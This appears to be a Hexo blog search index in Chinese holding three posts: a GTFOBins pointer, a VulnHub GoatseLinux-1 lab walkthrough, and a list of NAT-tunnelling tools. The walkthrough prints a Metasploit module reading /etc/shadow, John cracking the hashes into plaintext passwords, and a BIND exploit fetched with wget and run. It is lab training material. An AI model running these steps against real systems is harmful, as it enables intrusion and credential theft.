<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>linux权限提升检索大全</title>
    <url>/2019/12/03/Elevation-of-authority/</url>
    <content><![CDATA[<p>这个项目也是AlessandroZ大佬的，学习学习，写博客以便查阅。</p>
<p><font color="green">GTFOBins是一个精选的Unix二进制列表，攻击者可以利用它来绕过本地安全限制。</p>
<p>该项目收集了Unix二进制文件的合法功能，这些合法功能可被滥用来破坏受限制的shell，升级或维护提升的特权，传输文件，生成绑定和反向shell，以及促进其他开发后任务。 请参阅功能的完整列表。</font></p>
<a id="more"></a>

<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Elevation-of-authority.jpeg"></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ndGZvYmlucy5naXRodWIuaW8v">GTFOBins提权检索地址<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <categories>
        <category>linux提权</category>
      </categories>
      <tags>
        <tag>Elevation of authority</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[GoatseLinux-1]</title>
    <url>/2019/12/18/GoatseLinux-1/</url>
    <content><![CDATA[<p>名称：GoatseLinux：1<br>发布日期：2009年6月27日</p>
<p>下载：</p>
<ul>
<li>Download: <span class="exturl" data-url="aHR0cDovL25ldXRyb25zdGFyLm9yZy90bXAvR29hdHNlTGludXhfMS4wX1ZNLnJhcg==">http://neutronstar.org/tmp/GoatseLinux_1.0_VM.rar<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9nb2F0c2VsaW51eC9Hb2F0c2VMaW51eF8xLjBfVk0ucmFy">https://download.vulnhub.com/goatselinux/GoatseLinux_1.0_VM.rar<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9nb2F0c2VsaW51eC9Hb2F0c2VMaW51eF8xLjBfVk0ucmFyLnRvcnJlbnQ=">https://download.vulnhub.com/goatselinux/GoatseLinux_1.0_VM.rar.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<p>描述：</p>
<p>GoatseLinux v1.0 Pentest实验室虚拟机<br>史蒂夫·波顿<br>2009.06.27<br>在gnu许可下广泛分发。<br>这是专门为VMware 6.5兼容性而构建的。<br>警告：GoatseLinux是不安全的。 它被设计为用于进行渗透测试的实验室工具箱。 由于几乎所有安装的程序都具有广泛的开放性，因此强烈建议您不要将VM网络设置为除“基于主机”之外的任何方式，除非您喜欢将VM用作僵尸垃圾邮件箱。<br>笔记：<br>建立在Slax 5.0.7版本上。<br>资料来源：readme.txt</p>
<a id="more"></a>

<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>nmap伺候</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.142.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.142.132</span><br><span class="line">Host is up (0.00015s latency).</span><br><span class="line">MAC Address: 00:0C:29:0A:54:68 (VMware)</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sV -Pn -p- -v 192.168.142.132</span></span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">21/tcp    open  ftp</span><br><span class="line">22/tcp    open  ssh     OpenSSH 3.5p1 (protocol 1.99)</span><br><span class="line">25/tcp    open  smtp    Sendmail</span><br><span class="line">53/tcp    open  domain  ISC BIND 8.2.2-REL</span><br><span class="line">80/tcp    open  http    Apache httpd 1.3.31 ((Unix))</span><br><span class="line">587/tcp   open  smtp    Sendmail</span><br><span class="line">631/tcp   open  ipp     CUPS 1.1</span><br><span class="line">3306/tcp  open  mysql   MySQL (unauthorized)</span><br><span class="line">10000/tcp open  http    MiniServ 0.01 (Webmin httpd)</span><br></pre></td></tr></table></figure>

<p>发现:</p>
<p><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTQyLjEzMi8=">http://192.168.142.132/<i class="fa fa-external-link-alt"></i></span><br><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub68.jpg"></p>
<p><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTQyLjEzMi9nb2F0c2UuaHRtbA==">http://192.168.142.132/goatse.html<i class="fa fa-external-link-alt"></i></span><br><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub69.jpg"></p>
<p><span class="exturl" data-url="aHR0cDovLzE5Mi4xNjguMTQyLjEzMjoxMDAwMC8=">http://192.168.142.132:10000/<i class="fa fa-external-link-alt"></i></span><br><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/vulnhub70.jpg"></p>
<p>是基于Web的系统管理工具Webmin。Metasploit提供了三种漏洞利用:一个用于shell，两个用于获取任意文件的辅助模块。</p>
<p>msf伺候</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># msfdb run</span></span><br><span class="line">[+] Starting database</span><br><span class="line">                                                  </span><br><span class="line">                                   ___          ____</span><br><span class="line">                               ,-<span class="string">&quot;&quot;</span>   `.      &lt; HONK &gt;</span><br><span class="line">                             ,<span class="string">&#x27;  _   e )`-._ /  ----                                                   </span></span><br><span class="line"><span class="string">                            /  ,&#x27;</span> `-._&lt;.===-<span class="string">&#x27;                                                          </span></span><br><span class="line"><span class="string">                           /  /                                                                        </span></span><br><span class="line"><span class="string">                          /  ;                                                                         </span></span><br><span class="line"><span class="string">              _          /   ;                                                                         </span></span><br><span class="line"><span class="string"> (`._    _.-&quot;&quot; &quot;&quot;--..__,&#x27;</span>    |                                                                         </span><br><span class="line"> &lt;_  `-<span class="string">&quot;&quot;</span>                     \                                                                        </span><br><span class="line">  &lt;`-                          :                                                                       </span><br><span class="line">   (__   &lt;__.                  ;                                                                       </span><br><span class="line">     `-.   <span class="string">&#x27;-.__.      _.&#x27;</span>    /                                                                        </span><br><span class="line">        \      `-.__,-<span class="string">&#x27;    _,&#x27;</span>                                                                         </span><br><span class="line">         `._    ,    /__,-<span class="string">&#x27;                                                                            </span></span><br><span class="line"><span class="string">            &quot;&quot;._\__,&#x27;</span>&lt; &lt;____                                                                           </span><br><span class="line">                 | |  `----.`.                                                                         </span><br><span class="line">                 | |        \ `.                                                                       </span><br><span class="line">                 ; |___      \-``                                                                      </span><br><span class="line">                 \   --&lt;                                                                               </span><br><span class="line">                  `.`.&lt;                                                                                </span><br><span class="line">                    `-<span class="string">&#x27;                                                                                </span></span><br><span class="line"><span class="string">                                                                                                       </span></span><br><span class="line"><span class="string">                                                                                                       </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       =[ metasploit v5.0.64-dev                          ]</span></span><br><span class="line"><span class="string">+ -- --=[ 1952 exploits - 1092 auxiliary - 335 post       ]</span></span><br><span class="line"><span class="string">+ -- --=[ 562 payloads - 45 encoders - 10 nops            ]</span></span><br><span class="line"><span class="string">+ -- --=[ 7 evasion                                       ]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">msf5 &gt; use auxiliary/admin/webmin/file_disclosure</span></span><br><span class="line"><span class="string">msf5 auxiliary(admin/webmin/file_disclosure) &gt; set RHOST 192.168.142.132</span></span><br><span class="line"><span class="string">RHOST =&gt; 192.168.142.132</span></span><br><span class="line"><span class="string">msf5 auxiliary(admin/webmin/file_disclosure) &gt; exploit</span></span><br><span class="line"><span class="string">[*] Running module against 192.168.142.132</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Attempting to retrieve /etc/passwd...</span></span><br><span class="line"><span class="string">[*] The server returned: 200 Document follows</span></span><br><span class="line"><span class="string">root:x:0:0::/root:/bin/bash</span></span><br><span class="line"><span class="string">bin:x:1:1:bin:/bin:</span></span><br><span class="line"><span class="string">daemon:x:2:2:daemon:/sbin:</span></span><br><span class="line"><span class="string">adm:x:3:4:adm:/var/log:</span></span><br><span class="line"><span class="string">lp:x:4:7:lp:/var/spool/lpd:</span></span><br><span class="line"><span class="string">sync:x:5:0:sync:/sbin:/bin/sync</span></span><br><span class="line"><span class="string">shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown</span></span><br><span class="line"><span class="string">halt:x:7:0:halt:/sbin:/sbin/halt</span></span><br><span class="line"><span class="string">mail:x:8:12:mail:/:</span></span><br><span class="line"><span class="string">news:x:9:13:news:/usr/lib/news:</span></span><br><span class="line"><span class="string">uucp:x:10:14:uucp:/var/spool/uucppublic:</span></span><br><span class="line"><span class="string">operator:x:11:0:operator:/root:/bin/bash</span></span><br><span class="line"><span class="string">games:x:12:100:games:/usr/games:</span></span><br><span class="line"><span class="string">ftp:x:14:50::/var/ftp:</span></span><br><span class="line"><span class="string">smmsp:x:25:25:smmsp:/var/spool/clientmqueue:</span></span><br><span class="line"><span class="string">mysql:x:27:27:MySQL:/var/lib/mysql:/bin/bash</span></span><br><span class="line"><span class="string">rpc:x:32:32:RPC portmap user:/:/bin/false</span></span><br><span class="line"><span class="string">sshd:x:33:33:sshd:/:</span></span><br><span class="line"><span class="string">gdm:x:42:42:GDM:/var/state/gdm:/bin/bash</span></span><br><span class="line"><span class="string">pop:x:90:90:POP:/:</span></span><br><span class="line"><span class="string">nobody:x:99:99:nobody:/:</span></span><br><span class="line"><span class="string">guest:x:1000:100::/home/guest:/bin/bash</span></span><br><span class="line"><span class="string">goatse:x:1002:10:,,,:/home/goatse:/bin/bash</span></span><br><span class="line"><span class="string">jpelman:x:1003:100:,,,:/home/jpelman:/bin/bash</span></span><br><span class="line"><span class="string">jblow:x:1004:100:,,,:/home/jblow:/bin/bash</span></span><br><span class="line"><span class="string">[*] Auxiliary module execution completed</span></span><br><span class="line"><span class="string">msf5 auxiliary(admin/webmin/file_disclosure) &gt; set RPATH /etc/shadow</span></span><br><span class="line"><span class="string">RPATH =&gt; /etc/shadow</span></span><br><span class="line"><span class="string">msf5 auxiliary(admin/webmin/file_disclosure) &gt; exploit</span></span><br><span class="line"><span class="string">[*] Running module against 192.168.142.132</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Attempting to retrieve /etc/shadow...</span></span><br><span class="line"><span class="string">[*] The server returned: 200 Document follows</span></span><br><span class="line"><span class="string">root:$1$k6V/lmUF$n2iBfemYg/IsVRyjqopr3.:14422:0:::::</span></span><br><span class="line"><span class="string">bin:*:9797:0:::::</span></span><br><span class="line"><span class="string">daemon:*:9797:0:::::</span></span><br><span class="line"><span class="string">adm:*:9797:0:::::</span></span><br><span class="line"><span class="string">lp:*:9797:0:::::</span></span><br><span class="line"><span class="string">sync:*:9797:0:::::</span></span><br><span class="line"><span class="string">shutdown:*:9797:0:::::</span></span><br><span class="line"><span class="string">halt:*:9797:0:::::</span></span><br><span class="line"><span class="string">mail:*:9797:0:::::</span></span><br><span class="line"><span class="string">news:*:9797:0:::::</span></span><br><span class="line"><span class="string">uucp:*:9797:0:::::</span></span><br><span class="line"><span class="string">operator:*:9797:0:::::</span></span><br><span class="line"><span class="string">games:*:9797:0:::::</span></span><br><span class="line"><span class="string">ftp:*:9797:0:::::</span></span><br><span class="line"><span class="string">smmsp:*:9797:0:::::</span></span><br><span class="line"><span class="string">mysql:*:9797:0:::::</span></span><br><span class="line"><span class="string">rpc:*:9797:0:::::</span></span><br><span class="line"><span class="string">sshd:*:9797:0:::::</span></span><br><span class="line"><span class="string">gdm:*:9797:0:::::</span></span><br><span class="line"><span class="string">pop:*:9797:0:::::</span></span><br><span class="line"><span class="string">nobody:*:9797:0:::::</span></span><br><span class="line"><span class="string">guest:$1$T7.0qXyH$hC4dje14rIUFJXbZUCkdB/:12876:0:99999:7:::</span></span><br><span class="line"><span class="string">goatse:$1$lXWz2SF8$sr5ux2i3UpMAf30t5uMtT0:14422:0:99999:7:::</span></span><br><span class="line"><span class="string">jpelman:$1$3nO0QVVF$Iy21QTWTrHPd5/6ZrAvrj.:14422:0:99999:7:::</span></span><br><span class="line"><span class="string">jblow:$1$35A0vqVF$MoYgZm/DxNS5nBZZk3Y2R1:14422:0:99999:7:::</span></span><br><span class="line"><span class="string">[*] Auxiliary module execution completed</span></span><br></pre></td></tr></table></figure>

<p>将/etc/shadow保存为.txt文件然后使用john破解密码的hash,左边是密码，右边是用户名。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># john --wordlist=/usr/share/wordlists/rockyou.txt /root/goastshadow</span></span><br><span class="line">Warning: detected <span class="built_in">hash</span> <span class="built_in">type</span> <span class="string">&quot;md5crypt&quot;</span>, but the string is also recognized as <span class="string">&quot;md5crypt-long&quot;</span></span><br><span class="line">Use the <span class="string">&quot;--format=md5crypt-long&quot;</span> option to force loading these as that <span class="built_in">type</span> instead</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 5 password hashes with 5 different salts (md5crypt, crypt(3) <span class="variable">$1</span>$ (and variants) [MD5 256/256 AVX2 8x3])</span><br><span class="line">Will run 4 OpenMP threads</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">bobby            (jpelman)</span><br><span class="line">kokomo           (jblow)</span><br><span class="line">guest            (guest)</span><br><span class="line">gaping           (goatse)</span><br><span class="line">4g 0:00:00:49 DONE (2019-12-18 21:35) 0.08014g/s 282509p/s 320894c/s 320894C/s !!!0mc3t..*7¡Vamos!</span><br><span class="line">Use the <span class="string">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure>

<p>使用其中一个用户goatse登录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># ssh goatse@192.168.142.132</span></span><br><span class="line">The authenticity of host <span class="string">&#x27;192.168.142.132 (192.168.142.132)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">RSA key fingerprint is SHA256:25uPigwKnzugpFkHd91FCdBukcikll8dkH4oV7OQROY.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>192.168.142.132<span class="string">&#x27; (RSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">goatse@192.168.142.132&#x27;</span>s password: </span><br><span class="line">Linux 2.6.15.</span><br><span class="line">goatse@slax:~$ id</span><br><span class="line">uid=1002(goatse) gid=10(wheel) groups=10(wheel)</span><br><span class="line">goatse@slax:~$ whoami</span><br><span class="line">goatse</span><br><span class="line">goatse@slax:~$ <span class="built_in">pwd</span></span><br><span class="line">/home/goatse</span><br><span class="line">goatse@slax:~$</span><br></pre></td></tr></table></figure>

<h3 id="提权1"><a href="#提权1" class="headerlink" title="提权1"></a>提权1</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">goatse@slax:~$ uname -a</span><br><span class="line">Linux slax 2.6.15 <span class="comment">#1 SMP Tue Jan 10 07:53:57 GMT 2006 i686 unknown unknown GNU/Linux</span></span><br><span class="line">goatse@slax:~$ sudo -s</span><br><span class="line">Password:</span><br><span class="line">root@slax:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy)</span><br><span class="line">root@slax:~<span class="comment"># whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<h3 id="提权2"><a href="#提权2" class="headerlink" title="提权2"></a>提权2</h3><p>另一个方法通过使用旧内核,prctl权限提升漏洞。<br>exp下载，<span class="exturl" data-url="aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZG93bmxvYWQvMjgy">BIND<i class="fa fa-external-link-alt"></i></span></p>
<p>kali端</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># python -m SimpleHTTPServer</span></span><br></pre></td></tr></table></figure>

<p>shell端</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">goatse@slax:~$ wget http://192.168.142.128:8000/282.c</span><br><span class="line">--20:16:25--  http://192.168.142.128:8000/282.c</span><br><span class="line">           =&gt; `282.c<span class="string">&#x27;</span></span><br><span class="line"><span class="string">Connecting to 192.168.142.128:8000... connected.</span></span><br><span class="line"><span class="string">HTTP request sent, awaiting response... 200 OK</span></span><br><span class="line"><span class="string">Length: 16,429 (16K) [text/plain]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">100%[===========================================================&gt;] 16,429        --.--K/s             </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">20:16:25 (290.15 MB/s) - `282.c&#x27;</span> saved [16429/16429]</span><br></pre></td></tr></table></figure>

<p>编译并运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">goatse@slax:~$ gcc 282.c -o <span class="built_in">bind</span></span><br><span class="line">282.c:565:28: warning: no newline at end of file</span><br><span class="line">goatse@slax:~$ ls</span><br><span class="line">282.c*  <span class="built_in">bind</span>*  test.sh*</span><br><span class="line">oatse@slax:~$ ./<span class="built_in">bind</span> 127.0.0.1</span><br><span class="line">[*] named 8.2.x (&lt; 8.2.3-REL) remote root exploit by lucysoft, Ix</span><br><span class="line">[*] fixed by ian@cypherpunks.ca and jwilkins@bitland.net</span><br><span class="line"></span><br><span class="line">[*] attacking 127.0.0.1 (127.0.0.1)</span><br><span class="line">[d] HEADER is 12 long</span><br><span class="line">[d] infoleak_qry was 476 long</span><br><span class="line">[*] iquery resp len = 719</span><br><span class="line">[d] argevdisp1 = 080d7cd0, argevdisp2 = b7daea64</span><br><span class="line">[*] retrieved stack offset = bfc2a8f8</span><br><span class="line">[d] evil_query(buff, bfc2a8f8)</span><br><span class="line">[d] shellcode is 134 long</span><br><span class="line">[d] olb = 248</span><br><span class="line">[x] could not write our data <span class="keyword">in</span> buffer (offset0=56, rroffsetidx=4)</span><br><span class="line">[x] error sending tsig packet</span><br></pre></td></tr></table></figure>

<p>不知为什么一直运行失败，此SSH上还有一个root漏洞利用。 还有Apache的权限提升。 以及CUPS中的多个远程Shell漏洞。 这是一个旧漏洞的游乐场。 Metasploitable具有更多易受攻击的服务（以及Metasploitable 2），如果您正在寻找这样的游乐场，建议选择Goatsie上的那些。</p>
<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>超全内网穿透工具,github项目及方法</title>
    <url>/2019/11/29/Intranet-penetration/</url>
    <content><![CDATA[<h4 id="超全的内网穿透工具及方法集于此文章，及各种内网穿透的github项目收集—助你撸穿内网——Good-luck"><a href="#超全的内网穿透工具及方法集于此文章，及各种内网穿透的github项目收集—助你撸穿内网——Good-luck" class="headerlink" title="超全的内网穿透工具及方法集于此文章，及各种内网穿透的github项目收集—助你撸穿内网——Good luck!!!!!!!!!!!!!"></a><font color="red"><strong><em>超全的内网穿透工具及方法集于此文章，及各种内网穿透的github项目收集—助你撸穿内网——Good luck!!!!!!!!!!!!!</em></strong></font></h4><h4 id="内网穿透原理"><a href="#内网穿透原理" class="headerlink" title="内网穿透原理"></a>内网穿透原理</h4><p>简单地说，内网穿透依赖于 NAT 原理，根据 NAT 设备不同大致可分为以下 4 大类(前3种NAT类型可统称为cone类型)：</p>
<ul>
<li>全克隆(Full Cone)：NAT 把所有来自相同内部 IP 地址和端口的请求映射到相同的外部 IP 地址和端口上，任何一个外部主机均可通过该映射反向发送 IP 包到该内部主机</li>
<li>限制性克隆(Restricted Cone)：NAT 把所有来自相同内部 IP 地址和端口的请求映射到相同的外部 IP 地址和端口；但是，只有当内部主机先给 IP 地址为 X 的外部主机发送 IP 包时，该外部主机才能向该内部主机发送 IP 包</li>
<li>端口限制性克隆(Port Restricted Cone)：端口限制性克隆与限制性克隆类似，只是多了端口号的限制，即只有内部主机先向 IP 地址为 X，端口号为 P 的外部主机发送1个 IP 包,该外部主机才能够把源端口号为 P 的 IP 包发送给该内部主机</li>
<li>对称式NAT(Symmetric NAT)：这种类型的 NAT 与上述3种类型的不同，在于当同一内部主机使用相同的端口与不同地址的外部主机进行通信时， NAT 对该内部主机的映射会有所不同；对称式 NAT 不保证所有会话中的私有地址和公开 IP 之间绑定的一致性；相反，它为每个新的会话分配一个新的端口号；导致此种 NAT 根本没法穿透</li>
</ul>
<a id="more"></a>

<p>内网穿透的作用就是利用以上规则，创建一条从外部服务器到内部设备的 “隧道”，具体的 NAT 原理等可参考<br><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h6aHNhbi9hcnRpY2xlL2RldGFpbHMvNDUwMzgyNjU=">网络地址转换NAT原理（易于理解）<i class="fa fa-external-link-alt"></i></span></p>
<p>其它内网穿透原理及开发文章可参考：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zMDM1MTk0Mw==">内网穿透工具的原理与开发实战<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC83ZTA5ODAxNmMxZTM=">内网穿透原理解析<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="常见内网穿透方法及价格比较"><a href="#常见内网穿透方法及价格比较" class="headerlink" title="常见内网穿透方法及价格比较"></a>常见内网穿透方法及价格比较</h3><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/neiwang.jpg"></p>
<h3 id="FRP-本人使用"><a href="#FRP-本人使用" class="headerlink" title="FRP(本人使用)"></a>FRP(本人使用)</h3><p>frp 是一个可用于内网穿透的高性能的反向代理应用，支持 tcp, udp, http, https 协议。利用处于内网或防火墙后的机器，对外网环境提供 http 或 https 服务。对于 http, https 服务支持基于域名的虚拟主机，支持自定义域名绑定，使多个域名可以共用一个80端口。利用处于内网或防火墙后的机器，对外网环境提供 tcp 和 udp 服务，例如在家里通过 ssh 访问处于公司内网环境内的主机。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZhdGVkaWVyL2ZycC9ibG9iL21hc3Rlci9SRUFETUVfemgubWQ=">frp官方中文使用说明文档<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC8wMGM3OWRmMWFhZjA=">一款很好用的内网穿透工具–FRP<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9tcml0ZC5tZS8yMDE3LzAxLzIxL3VzZS1mcnAtZm9yLWludGVybmFsLW5ldHdvcmstd2Vhci8=">利用 frp 进行内网穿透<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmJyZWFrZXJpbmcuY29tLzIwMTgvMDkvMjgvZnJwLw==">内网穿透frp<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9mZmlzLm1lL2V4cGVyaWVuY2UvMTI2Ni5odG1s">使用frp搭建内网穿透和基友畅玩我的世界<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="natapp"><a href="#natapp" class="headerlink" title="natapp"></a>natapp</h3><p>natapp是 基于ngrok的国内收费内网穿透工具，类似花生壳，有免费版本，比花生壳好。免费版本：提供http,https,tcp全隧道穿透，随机域名/TCP端口，不定时强制更换域名/端口，自定义本地端口</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9qdWVqaW4uaW0vcG9zdC81Y2FkNWU2NzUxODgyNTFiMWIyZjU1MTc=">内网穿透（mac，window，linux通用）1分钟实现外网访问电脑本地服务器<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9uYXRhcHAuY24vYXJ0aWNsZS9uYXRhcHBfbmV3Ymll">NATAPP1分钟快速新手图文教程<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="ngrok"><a href="#ngrok" class="headerlink" title="ngrok"></a>ngrok</h3><p>ngrok 是一个反向代理，通过在公共端点和本地运行的 Web 服务器之间建立一个安全的通道，实现内网主机的服务可以暴露给外网。ngrok 可捕获和分析所有通道上的流量，便于后期分析和重放，所以ngrok可以很方便地协助服务端程序测试。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3poYW5nZ3VvNS9hcnRpY2xlL2RldGFpbHMvNzc4NDg2NTg=">超详细内网穿透(墙裂推荐,建议备份此文章)<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9sdW96bS5naXRodWIuaW8vbmdyb2s=">ngrok搭建指南<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2luY29uc2hyZXZlYWJsZS9uZ3Jvaw==">ngrok github地址及官方文档说明<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9uZ3Jvay5jb20v">ngrok官网<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3lqY18xMTExL2FydGljbGUvZGV0YWlscy83OTM1MzcxOA==">10分钟教你搭建自己的ngrok服务器<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8zMzc5NDcwNw==">ngrok 实现内网穿透<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly90c3Vra29taS5vcmcvcG9zdC91c2Utbmdyb2stdG8tcHVjaC10aGUtbmF0">内网穿透之ngrok<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cuamlhbnNodS5jb20vcC9jMjczZDMwMDlkZWQ=">ngrok 内网映射<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly81eHJ1YnkudHcvcG9zdHMvZWFzeS1uZ3Jvay1ieS1uZ2lueC1zc2gtdHVubmVsLw==">ngrok 不求人：自己搭一個窮人版的 ngrok 服務<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9janRpbmcubWUvMjAxNi8wNS8yMS9uZ3Jvay10dXRvcmlhbC8=">使用 Ngrok 实现内网穿透<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Rvc2dvL25ncm9rLWM=">ngrok c版本<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2hhdW50ZWsvcHl0aG9uLW5ncm9rZA==">ngrok python版本<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="nps"><a href="#nps" class="headerlink" title="nps"></a>nps</h3><p>nps是一款轻量级、高性能、功能强大的内网穿透代理服务器。目前支持tcp、udp流量转发，可支持任何tcp、udp上层协议（访问内网网站、本地支付接口调试、ssh访问、远程桌面，内网dns解析等等……），此外还支持内网http代理、内网socks5代理、p2p等，并带有功能强大的web管理端。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NubGgvbnBz">nps 官方github及使用说明文档<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="ZeroTier"><a href="#ZeroTier" class="headerlink" title="ZeroTier"></a>ZeroTier</h3><p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLndoc2lyLmNvbS9wb3N0LTM2ODUuaHRtbA==">无公网IP通过ZeroTier方便实现内网穿透（详细）<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="Socket-Pipe"><a href="#Socket-Pipe" class="headerlink" title="Socket Pipe"></a>Socket Pipe</h3><p><span class="exturl" data-url="aHR0cHM6Ly9qb3lxaS5jb20vamF2YXNjcmlwdC9zb2NrZXQtcGlwZS5odG1s">纯手工自制的内网穿透瑞士军刀 Socket Pipe<i class="fa fa-external-link-alt"></i></span></p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2pveXFpL3NvY2tldC1waXBl">Socket Pipe github<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="holer"><a href="#holer" class="headerlink" title="holer"></a>holer</h3><p>Holer是一个将局域网中的应用映射到公网访问的端口映射软件，支持转发基于TCP协议的报文。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1dpc2RvbS1Qcm9qZWN0cy9ob2xlcg==">holer github<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="Lunnel"><a href="#Lunnel" class="headerlink" title="Lunnel"></a>Lunnel</h3><p>lunnel 是一款简单易用的内网NAT穿越、反向代理软件，支持 HTTP, HTTPS, UDP, TCP、Unix socket 协议。<br><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xvbmdYYm95L2x1bm5lbA==">lunnel github<i class="fa fa-external-link-alt"></i></span></p>
